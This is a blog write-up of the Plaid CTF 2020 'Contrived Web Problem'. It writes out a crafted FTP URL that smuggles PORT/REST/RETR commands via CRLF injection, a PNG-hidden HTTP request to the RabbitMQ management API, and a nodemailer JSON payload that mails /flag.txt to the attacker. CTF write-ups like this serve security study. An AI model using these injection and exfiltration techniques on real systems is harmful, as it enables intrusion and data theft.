<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=manifest href=/manifest.json><meta name=description content="Here is my write up of Contrived Web Problem in Plaid CTF 2020.
"><title>Plaid CTF 2020 Contrived Web Problem Write Up</title><link rel=canonical href=https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/><link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="Plaid CTF 2020 Contrived Web Problem Write Up"><meta property="og:description" content="Here is my write up of Contrived Web Problem in Plaid CTF 2020.
"><meta property="og:url" content="https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/"><meta property="og:site_name" content="Zeddy's Blog"><meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:tag" content="wp"><meta property="article:published_time" content="2020-04-20T21:09:56+00:00"><meta property="article:modified_time" content="2020-04-20T21:09:56+00:00"><meta name=twitter:site content="@ZeddYu_Lu"><meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="Plaid CTF 2020 Contrived Web Problem Write Up"><meta name=twitter:description content="Here is my write up of Contrived Web Problem in Plaid CTF 2020.
"><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDESKL57LT',{anonymize_ip:!1})}</script></head><body class="article-page has-toc"><script>(function(){const e='StackColorScheme';localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t='StackColorScheme',e=localStorage.getItem(t),n=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;e=='dark'||e==='auto'&&n?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script><div class="container main-container flex
extended"><div id=article-toolbar><a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg><span>Back</span></a></div><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>CTF</a></header><h2 class=article-title><a href=/2020/04/20/Plaid-CTF-2020-Web-1/>Plaid CTF 2020 Contrived Web Problem Write Up</a></h2><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Apr 20, 2020</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>5 minute read</time></div></footer></div></header><section class=article-content><p>Here is my write up of Contrived Web Problem in Plaid CTF 2020.</p><p>[TOC]</p><h2 id=tldr>TL;DR</h2><p>You can get the attachment of the chall in this <a class=link href=https://github.com/ZeddYu/Plaid-CTF-2020-Web target=_blank rel=noopener>repo</a>.</p><ol><li>You can find CRLF in ftp then use CRLF to inject ftp command.</li><li>You can use PORT command to build a TCP connection with rabbitmq server.</li><li>Make a HTTP message which can let the nodemailer send a email containing the flag as a attachment to your email through rabbitmq web api.</li><li>Hide this HTTP message in a PNG. Upload the picture as your profile.</li><li>Use the REST command to cut the PNG and let PETR command return the HTTP message which is in the PNG to rabbitmq server.</li><li>Check FLAG in your email.</li></ol><h2 id=crlf-in-ftp>CRLF in FTP</h2><p>We guess there should be a CRLF in FTP at first. And use <code>%250d%250a</code> to test it because it use the following code.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-typescript data-lang=typescript><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>parsed</span><span class=p>.</span><span class=nx>protocol</span> <span class=o>===</span> <span class=s2>&#34;ftp:&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>username</span> <span class=o>=</span> <span class=nb>decodeURIComponent</span><span class=p>(</span><span class=nx>parsed</span><span class=p>.</span><span class=nx>username</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>password</span> <span class=o>=</span> <span class=nb>decodeURIComponent</span><span class=p>(</span><span class=nx>parsed</span><span class=p>.</span><span class=nx>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>filename</span> <span class=o>=</span> <span class=nb>decodeURIComponent</span><span class=p>(</span><span class=nx>parsed</span><span class=p>.</span><span class=nx>pathname</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>ftpClient</span> <span class=o>=</span> <span class=k>await</span> <span class=nx>connectFtp</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=nx>host</span>: <span class=kt>parsed.hostname</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>port</span>: <span class=kt>parsed.port</span> <span class=o>!==</span> <span class=s2>&#34;&#34;</span> <span class=o>?</span> <span class=nb>parseInt</span><span class=p>(</span><span class=nx>parsed</span><span class=p>.</span><span class=nx>port</span><span class=p>)</span> <span class=o>:</span> <span class=kc>undefined</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>user</span>: <span class=kt>username</span> <span class=o>!==</span> <span class=s2>&#34;&#34;</span> <span class=o>?</span> <span class=nx>username</span> : <span class=kt>undefined</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>password</span>: <span class=kt>password</span> <span class=o>!==</span> <span class=s2>&#34;&#34;</span> <span class=o>?</span> <span class=nx>password</span> : <span class=kt>undefined</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=nx>image</span> <span class=o>=</span> <span class=k>await</span> <span class=nx>ftpClient</span><span class=p>.</span><span class=kr>get</span><span class=p>(</span><span class=nx>filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Send this url through <code>api/image</code>.</p><pre tabindex=0><code>GET /api/image?url=ftp://2:2%250d%250aPORT%20172,32,56,72,61,56%250d%250aREST%206%250d%250aRETR%20%252fuser%252fb21791e2-6016-4c36-8f9a-6054750d2b5a%252fprofile%252epng@ftp:21/user/b21791e2-6016-4c36-8f9a-6054750d2b5a/profile.png 
</code></pre><p>This url will make a request like this.</p><p><figure class=gallery-image style=flex-grow:107;flex-basis:257px><a href=/2020/04/20/Plaid-CTF-2020-Web-1/1.png data-size=1136x1060><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/1.png width=1136 height=1060 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/1_hu2534235a6890b2653b295e7674384fb3_214938_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/1_hu2534235a6890b2653b295e7674384fb3_214938_1024x0_resize_box_3.png 1024w" loading=lazy></a></figure></p><p>So we get a CRLF now.</p><p>Or you can audit the code of ftp <a class=link href=https://github.com/mscdex/node-ftp target=_blank rel=noopener>https://github.com/mscdex/node-ftp</a> then you can find it do nothing with CRLF.</p><h2 id=the-active-mode-of-ftp>The active mode of FTP</h2><p>FTP have two modes, one is active and the other is passive.</p><blockquote><p>In <em>active</em> mode, the client establishes the command channel but the <em>server</em> is responsible for establishing the data channel. This can actually be a problem if, for example, the client machine is protected by firewalls and will not allow unauthorised session requests from external parties.</p><p>In <em>passive</em> mode, the client establishes <em>both</em> channels. We already know it establishes the command channel in active mode and it does the same here.</p></blockquote><p>If we don&rsquo;t inject code through CRLF, we can get the FTP traffic like this:</p><p><figure class=gallery-image style=flex-grow:133;flex-basis:319px><a href=/2020/04/20/Plaid-CTF-2020-Web-1/2.png data-size=1044x784><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/2.png width=1044 height=784 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/2_hu3dd3d8b5d9c777b8314f165c28777b6c_132757_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/2_hu3dd3d8b5d9c777b8314f165c28777b6c_132757_1024x0_resize_box_3.png 1024w" loading=lazy></a></figure></p><p>So it will use <code>PASV</code> command to open passive mode and build a connection with client.</p><p>Why not inject <code>PORT</code> commant through CRLF to let ftp-srv open active mode and let ftp-srv connect with my server?</p><p>Yeah. Just like this. I use <code>PORT</code> command to let ftp-srv connect with my server.</p><p><figure class=gallery-image style=flex-grow:107;flex-basis:257px><a href=/2020/04/20/Plaid-CTF-2020-Web-1/1.png data-size=1136x1060><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/1.png width=1136 height=1060 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/1_hu2534235a6890b2653b295e7674384fb3_214938_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/1_hu2534235a6890b2653b295e7674384fb3_214938_1024x0_resize_box_3.png 1024w" loading=lazy></a></figure></p><p>But if you try with <code>LIST</code> or something else following by <code>PORT</code> command, you can&rsquo;t get the response on your server. It&rsquo;s a bit strange that I still confused about it. If you know something about this, welcome to discuss.</p><h2 id=the-mail-server>The mail server</h2><p>And how can we get flag? Use FTP? But the flag.txt is not on the ftp server. So we should think about how to get flag.</p><p>I notice there is a function that use to reset user&rsquo;s password.</p><p>services/api/index.ts</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-typescript data-lang=typescript><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s2>&#34;/password-reset&#34;</span><span class=p>,</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=o>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=p>{</span> <span class=nx>email</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>email</span> <span class=o>!==</span> <span class=s2>&#34;string&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>500</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;Bad body&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>newPassword</span> <span class=o>=</span> <span class=nb>Array</span><span class=p>.</span><span class=kr>from</span><span class=p>(</span><span class=k>new</span> <span class=nb>Array</span><span class=p>(</span><span class=mi>16</span><span class=p>),</span> <span class=p>()</span> <span class=o>=&gt;</span> <span class=s2>&#34;abcdefghijklmnopqrstuvwxyz0123456789&#34;</span><span class=p>[</span><span class=nb>Math</span><span class=p>.</span><span class=nx>floor</span><span class=p>(</span><span class=nb>Math</span><span class=p>.</span><span class=nx>random</span><span class=p>()</span> <span class=o>*</span> <span class=mi>36</span><span class=p>)]).</span><span class=nx>join</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>hashedPassword</span> <span class=o>=</span> <span class=k>await</span> <span class=nx>bcrypt</span><span class=p>.</span><span class=nx>hash</span><span class=p>(</span><span class=nx>newPassword</span><span class=p>,</span> <span class=mi>14</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>await</span> <span class=nx>withClient</span><span class=p>((</span><span class=nx>client</span><span class=p>)</span> <span class=o>=&gt;</span> <span class=nx>client</span><span class=p>.</span><span class=nx>query</span><span class=p>(</span><span class=sb>`
</span></span></span><span class=line><span class=cl><span class=sb>UPDATE user_auth
</span></span></span><span class=line><span class=cl><span class=sb>SET password = $2
</span></span></span><span class=line><span class=cl><span class=sb>WHERE email = $1
</span></span></span><span class=line><span class=cl><span class=sb>`</span><span class=p>,</span> <span class=p>[</span><span class=nx>email</span><span class=p>,</span> <span class=nx>hashedPassword</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>channel</span> <span class=o>=</span> <span class=k>await</span> <span class=nx>rabbit</span><span class=p>.</span><span class=nx>createChannel</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=nx>channel</span><span class=p>.</span><span class=nx>sendToQueue</span><span class=p>(</span><span class=s2>&#34;email&#34;</span><span class=p>,</span> <span class=nx>Buffer</span><span class=p>.</span><span class=kr>from</span><span class=p>(</span><span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=nx>to</span>: <span class=kt>email</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>subject</span><span class=o>:</span> <span class=s2>&#34;Password Reset&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>text</span><span class=o>:</span> <span class=sb>`Hello there, your new password is </span><span class=si>${</span><span class=nx>newPassword</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=p>})));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>200</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;Password reset&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></div><p>It seems we can&rsquo;t control the <code>${newPassword}</code>. But I find a way to get flag through reading nodemailer&rsquo;s documentation.</p><p><a class=link href=https://nodemailer.com/message/attachments/ target=_blank rel=noopener>https://nodemailer.com/message/attachments/</a></p><p>We can send an email containing the flag as attachment! We can make a json like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;to&#34;</span><span class=p>:</span><span class=s2>&#34;your@gmail.com&#34;</span><span class=p>,</span><span class=nt>&#34;subject&#34;</span><span class=p>:</span><span class=s2>&#34;Password Reset&#34;</span><span class=p>,</span><span class=nt>&#34;text&#34;</span><span class=p>:</span><span class=s2>&#34;Hello there, your new password is newpass&#34;</span><span class=p>,</span><span class=nt>&#34;attachments&#34;</span><span class=p>:[{</span><span class=nt>&#34;filename&#34;</span><span class=p>:</span><span class=s2>&#34;flag.txt&#34;</span><span class=p>,</span><span class=nt>&#34;path&#34;</span><span class=p>:</span><span class=s2>&#34;/flag.txt&#34;</span><span class=p>}]}</span>
</span></span></code></pre></div><p>So what we need to do is to control nodemailer to send our message.</p><h2 id=rabbitmq>rabbitmq</h2><p>services/email/index.ts</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-typescript data-lang=typescript><span class=line><span class=cl><span class=kd>let</span> <span class=nx>channel</span> <span class=o>=</span> <span class=k>await</span> <span class=nx>rabbit</span><span class=p>.</span><span class=nx>createChannel</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>channel</span><span class=p>.</span><span class=nx>consume</span><span class=p>(</span><span class=s2>&#34;email&#34;</span><span class=p>,</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>msg</span><span class=p>)</span> <span class=o>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>msg</span> <span class=o>===</span> <span class=kc>null</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nx>channel</span><span class=p>.</span><span class=nx>ack</span><span class=p>(</span><span class=nx>msg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>data</span> <span class=o>=</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=nx>msg</span><span class=p>.</span><span class=nx>content</span><span class=p>.</span><span class=nx>toString</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=k>await</span> <span class=nx>transport</span><span class=p>.</span><span class=nx>sendMail</span><span class=p>({</span>
</span></span><span class=line><span class=cl>      <span class=kr>from</span><span class=o>:</span> <span class=s2>&#34;plaid2020problem@gmail.com&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>subject</span><span class=o>:</span> <span class=s2>&#34;Your Account&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=p>...</span><span class=nx>data</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=nx>e</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span></code></pre></div><p>And we can find how server sendemail here. It uses rabbitmq. And rabbitmq has got web api.</p><p>So it seems we can control what nodemailer send through rabbitmq&rsquo;s web api.</p><p>But how can we send http request to rabbitmq? It seems we have got the method how to get flag and the method let ftp server build TCP connection with arbitrary server.</p><p>It seems we need a connection with them!</p><h2 id=ssrf>SSRF!</h2><p>The last key to solve this problem is let the ftp server send a http request to rabbitmq server.</p><p>But how?</p><p>We notice that we can hide a http message in the profile png and use <code>RRETR</code> to let the ftp server return the message of png.</p><p><figure class=gallery-image style=flex-grow:216;flex-basis:519px><a href=/2020/04/20/Plaid-CTF-2020-Web-1/3.png data-size=2144x990><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/3.png width=2144 height=990 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/3_hue603c68732ff32e978ee0f6fbd652b43_310903_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/3_hue603c68732ff32e978ee0f6fbd652b43_310903_1024x0_resize_box_3.png 1024w" loading=lazy></a></figure></p><p>And use <code>REST 6</code> to cut the message, make the response like a http message. This is similar with http response splitting.</p><p>So when ftp server return the data of profile picture, it will return data like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/api/exchanges/%2f/amq%2edefault/publish</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>172.32.56.72:15672</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>authorization</span><span class=o>:</span> <span class=l>Basic dGVzdDp0ZXN0</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>300</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;properties&#34;</span><span class=p>:{},</span><span class=nt>&#34;routing_key&#34;</span><span class=p>:</span><span class=s2>&#34;email&#34;</span><span class=p>,</span><span class=nt>&#34;payload&#34;</span><span class=p>:</span><span class=s2>&#34;your_payload&#34;</span><span class=p>,</span><span class=nt>&#34;payload_encoding&#34;</span><span class=p>:</span><span class=s2>&#34;base64&#34;</span><span class=p>}</span>
</span></span></code></pre></div><p>But the TCP connection is not persisted, we can&rsquo;t get the response of rabbitmq server and most importantly we can&rsquo;t add a new message in rabbitmq queue.</p><p>During the competition, we have to frequently send lots of requests to api server. Hope some requests can exploit successfully. At last we made it once.</p><p>After ctf ends, @zwad3, the author of this chall, replied to me.</p><p>{% twitter <a class=link href=https://twitter.com/zwad3/status/1252087190278082562 target=_blank rel=noopener>https://twitter.com/zwad3/status/1252087190278082562</a> %}</p><p>He mentioned we should send the real request followed by 50,000 dumb requests (in one file). I tried this method today and this really gave 100% success rate.</p><p><figure class=gallery-image style=flex-grow:216;flex-basis:519px><a href=/2020/04/20/Plaid-CTF-2020-Web-1/3.png data-size=2144x990><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/3.png width=2144 height=990 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/3_hue603c68732ff32e978ee0f6fbd652b43_310903_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/3_hue603c68732ff32e978ee0f6fbd652b43_310903_1024x0_resize_box_3.png 1024w" loading=lazy></a></figure></p><p>Just like this, I put 1000 http get requests in one file and every time can get flag.</p><p><figure class=gallery-image style=flex-grow:171;flex-basis:410px><a href=/2020/04/20/Plaid-CTF-2020-Web-1/4.png data-size=832x486><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/4.png width=832 height=486 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/4_huf9bca2348c75ea9ea9f86c51daef134d_46888_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/4_huf9bca2348c75ea9ea9f86c51daef134d_46888_1024x0_resize_box_3.png 1024w" loading=lazy></a></figure></p><p>Interesting challange! Hope u enjoy!</p></section><footer class=article-footer><section class=article-tags><a href=/tags/CTF/>CTF</a>
<a href=/tags/wp/>wp</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section><div class="notice notice-tip"><div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br></div></footer></article><aside class=related-contents--wrapper><h2 class=section-title>Related contents</h2><div class=related-contents><div class="flex article-list--tile"><article><a href=/2020/04/24/Plaid-CTF-2020-Web-2/><div class=article-details><h2 class=article-title>Plaid CTF 2020 Catalog</h2></div></a></article><article><a href=/2019/06/04/2019qwb/><div class=article-details><h2 class=article-title>2019强网杯部分Web wp</h2></div></a></article><article><a href=/2019/05/30/2019iscc/><div class=article-details><h2 class=article-title>2019 ISCC Web wp</h2></div></a></article><article><a href=/2019/05/09/2019ciscn-RefSpace/><div class=article-details><h2 class=article-title>2019 CISCN RefSpace</h2></div></a></article><article><a href=/2019/05/06/2019ciscn/><div class=article-details><h2 class=article-title>2019 CISCN Web wp</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var t=document,e=t.createElement('script');e.async=!0,e.src='//ZeddYu.disqus.com/embed.js',e.setAttribute('data-timestamp',+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener('onColorSchemeChange',e=>{DISQUS&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2018 -
2022 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#tldr>TL;DR</a></li><li><a href=#crlf-in-ftp>CRLF in FTP</a></li><li><a href=#the-active-mode-of-ftp>The active mode of FTP</a></li><li><a href=#the-mail-server>The mail server</a></li><li><a href=#rabbitmq>rabbitmq</a></li><li><a href=#ssrf>SSRF!</a></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script><script>(function(){const e=document.createElement('link');e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>